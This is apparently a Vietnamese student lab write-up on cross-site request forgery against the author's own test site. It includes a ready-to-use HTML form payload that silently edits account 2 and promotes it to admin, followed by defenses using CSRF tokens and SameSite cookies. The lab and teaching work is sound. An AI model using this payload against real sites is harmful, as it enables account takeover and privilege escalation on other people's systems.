Người thực hiện: Lê Trần Văn Chương
Ngày: 18/04/2022

- Link: 
    - Victim: https://00bluec10.000webhostapp.com/index.php
    - Attack: https://php-bacsic.000webhostapp.com/
- Để có thể attack vào trước tiên user phải login vào trước để có thể `Cookie` của user đó để attack.
- Khi user đã login và lấy được `Cookie` thì ta gửi cho user host đã chuẩn bị sẵn để user nhấn vào bắt đầu đổi thông tin,... 
- Dưới đây là 1 đoạn `Code` html đơn giản để có thể đổi user có `accountId=2` những thông tin đã nhập trong form sẵn và chuyển user này thành `Admin`:
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://00bluec10.000webhostapp.com/EditAccount.php?accountId=2" method="POST">
      <input type="hidden" name="username" value="CSRF" />
      <input type="hidden" name="email" value="csrf@gmail.com" />
      <input type="hidden" name="password" value="asd" />
      <input type="hidden" name="role" value="1" />
      <input type="hidden" name="editUser" value="Edit" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
- Trước khi attack
![Hinh 1.](~/../img/1.png)

- Sau khi attack
![Hinh 2.](~/../img/2.png)

## Phòng chống
- Cách dễ dàng nhất là ta sẽ thêm vào form 1 cái `token` nếu mà gửi lên server mà không có cái token này thì nó sẽ hiện lỗi.
```html
<form action="/ex.com" method="post">
<input type="hidden" name="CSRFToken" value="OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==">
[...]
</form>
```
- Hoặc có thể dùng thuộc tính `Samsite` của `Cookie` để phòng chống và đặt `SameSite=Strict` sẽ ngăn trình duyệt gửi cookie đi.

